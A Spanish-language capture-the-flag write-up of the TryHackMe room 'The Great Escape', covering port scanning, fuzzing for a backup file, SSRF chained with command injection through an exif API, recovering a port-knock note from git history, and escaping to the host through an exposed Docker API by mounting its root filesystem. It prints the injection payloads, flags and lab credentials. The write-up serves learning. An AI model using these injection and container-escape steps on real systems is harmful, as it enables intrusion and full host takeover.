# The Great Escape

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/59726e92-d5ea-4a31-9070-8c56abdd89d0)

***
 Source: https://tryhackme.com/room/thegreatescape
- OS: Linux
- Dificultad: Medium
- IP: No estática
- Temas: `Docker Breakout`, `SSRF`.
***
- Realizamos un escaneo de puertos para saber a que nos enfrentamos.

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV escape.thm
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-09 10:43 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 10:43
Scanning 10.10.231.116 [65535 ports]
Discovered open port 80/tcp on 10.10.231.116
Discovered open port 22/tcp on 10.10.231.116
Completed SYN Stealth Scan at 10:43, 24.01s elapsed (65535 total ports)
Initiating Service scan at 10:43
Scanning 2 services on 10.10.231.116
Completed Service scan at 10:46, 163.78s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.231.116.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 1.80s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:46
Completed NSE at 10:46, 1.33s elapsed
Nmap scan report for 10.10.231.116
Host is up, received user-set (0.23s latency).
Scanned at 2024-02-09 10:43:33 EST for 191s
Not shown: 34256 closed tcp ports (reset), 31277 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh?    syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60 nginx 1.19.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.94%I=7%D=2/9%Time=65C64848%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,F,"\.kp=W>4a;=\x20c3\r\n");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.28 seconds
           Raw packets sent: 118622 (5.219MB) | Rcvd: 39471 (1.579MB)
~~~

- Vemos solo dos servicios, en este caso creo que será más optimo enumerar el servidor http que está hosteado en el puerto 80.
- Encontré un robotx.txt en el servidor:

~~~txt
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
~~~

- Vi que existía un archivo `backup`, así que empleé `wfuzz` para bruteforcear la dirección de este:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ wfuzz -u http://10.10.192.74/FUZZ.bak.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 503 --hh 3834 -t 10 -c
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.192.74/FUZZ.bak.txt
Total requests: 220561

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000167:   200        64 L     125 W      1479 Ch     "exif-util"
~~~

- Y ahí está, podemos ver el contenido de esta ruta, y hay algunas cosas bastante interesantes:

~~~html
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>
~~~

- Vemos una ruta `http://api-dev-backup:8080/exif`, al parecer solo accesible desde el lado del servidor.
- Existe otro directorio que aun no enumeramos, que es el de `exif-util`.

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/90f3c2f7-5f85-4403-87cd-12d048a7958d)

- Este parece aceptar URL como parámetro para analizar archivos.
- Y parece ser vulnerable a ``SSRF``.

![[Pasted image 20240209104406.png]]

- Si interceptamos la petición con burpsuite, podemos ver esto:

~~~http
GET /api/exif?url=http:%2F%2F127.0.0.1:8080%2Fexif HTTP/1.1
Host: 10.10.192.74
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: es-MX,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.10.192.74/exif-util/
Cookie: auth.strategy=local
~~~

- El sitio web llama a la API, por lo que desde esta dirección, en teoría podríamos realizar peticiones con curl.
- Intenté ver si podíamos ejecutar comandos, y a través de ciertos parámetros, se nos permite hacerlo:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ curl 'http://10.10.192.74/api/exif?url=http://api-dev-backup:8080/exif?url=id;id'              
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               uid=0(root) gid=0(root) groups=0(root)
~~~

- Y bien, podemos ejecutar comandos.
- Hay bastantes que están baneados, pero podemos listar el directorio de root:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ curl 'http://10.10.192.74/api/exif?url=http://api-dev-backup:8080/exif?url=id;ls%20-la%20/root'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               total 28
drwx------ 1 root root 4096 Jan  7  2021 .
drwxr-xr-x 1 root root 4096 Jan  7  2021 ..
lrwxrwxrwx 1 root root    9 Jan  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 1 root root 4096 Jan  7  2021 .git
-rw-r--r-- 1 root root   53 Jan  6  2021 .gitconfig
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-rw-r-- 1 root root  201 Jan  7  2021 dev-note.txt
~~~

- Tenemos una nota, podemos ejecutar `cat` para ver el contenido.
- Tenemos unas credenciales `hydra:fluffybunnies123` pero no funcionan para ssh.
- Enumeraremos la carpeta `.git`, a ver si encontramos algo interesante:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ curl 'http://10.10.234.197/api/exif?url=http://api-dev-backup:8080/exif?url=id;git%20--git-dir%20/root/.git%20log'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
~~~

- Vemos un log donde se nos dice que la flag fue removida en un versión anterior, solo tendremos que ver como era esta con el commit que nos dan:
  
~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ curl 'http://10.10.234.197/api/exif?url=http://api-dev-backup:8080/exif?url=id;git%20-C%20/root/.git%20log%20-1%20a3d30a7d0510dc6565ff9316e3fb84434916dee8%20-p'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

diff --git a/dev-note.txt b/dev-note.txt
new file mode 100644
index 0000000..89dcd01
--- /dev/null
+++ b/dev-note.txt
@@ -0,0 +1,9 @@
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..aae8129
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1,3 @@
+You found the root flag, or did you?
+
+THM{0cb4b947043cb5c0486a454b75a10876}
\ No newline at end of file
~~~

- Perfecto, la nota nos dice también que debemos interactuar con ciertos puertos específicos para desbloquear el puerto del docker, hacemos un script que lo haga por nosotros:

~~~bash
#!/bin/bash
ip='10.10.234.197'
telnet $ip 42
telnet $ip 1337
telnet $ip 10420
telnet $ip 6969
telnet $ip 63000
~~~

- Lo ejecutamos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ ./0pport.sh 
Trying 10.10.234.197...
telnet: Unable to connect to remote host: Conexión rehusada
Trying 10.10.234.197...
telnet: Unable to connect to remote host: Conexión rehusada
Trying 10.10.234.197...
telnet: Unable to connect to remote host: Conexión rehusada
Trying 10.10.234.197...
telnet: Unable to connect to remote host: Conexión rehusada
Trying 10.10.234.197...
telnet: Unable to connect to remote host: Conexión rehusada
~~~

- Y vemos si se abrió un nuevo puerto, los resultados me arrojaron esto:

~~~bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh?    syn-ack ttl 60
80/tcp   open  http    syn-ack ttl 60 nginx 1.19.6
2375/tcp open  docker  syn-ack ttl 61 Docker 20.10.2 (API 1.41)
~~~

- Ahora bien, necesitamos entrar al docker, para esto podemos emplear monturas para montar el disco local en este contenedor.
- Primero, listamos las imágenes:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ sudo docker -H 10.10.234.197:2375 images
REPOSITORY                                    TAG       IMAGE ID       CREATED       SIZE
exif-api-dev                                  latest    4084cb55e1c7   3 years ago   214MB
exif-api                                      latest    923c5821b907   3 years ago   163MB
frontend                                      latest    577f9da1362e   3 years ago   138MB
endlessh                                      latest    7bde5182dc5e   3 years ago   5.67MB
nginx                                         latest    ae2feff98a0c   3 years ago   133MB
debian                                        10-slim   4a9cd57610d6   3 years ago   69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   3 years ago   103MB
alpine                                        3.9       78a2ce922f86   3 years ago   5.55MB
~~~

- Y con la imagen listada, sería cuestión de entrar a una realizando una montura:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ sudo docker -H 10.10.234.197:2375 run --rm -it -v /:/mnt/root --name 3sc4p3_1 frontend sh
# whoami
root
# pwd
/
# cd mnt/root/root
# ls
flag.txt
# cat flag.txt
Congrats, you found the real flag!

THM{c62517c0cad93ac93a92b1315a32d734}
~~~

***
<h4>Extra:</h4>
- Me dí cuenta de que existe otra flag, para conseguirla, debemos realizar una petición con un método `HEAD` y este nos responderá con la flag.
- Hay una ruta `.well-known/security.txt` que lo indica:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Great-Escape]
└─$ curl -X HEAD -iq http://10.10.234.197/api/fl46 
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the 
Warning: way you want. Consider using -I/--head instead.
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Fri, 09 Feb 2024 22:02:01 GMT
Connection: keep-alive
flag: THM{b801135794bf1ed3a2aafaa44c2e5ad4}
~~~

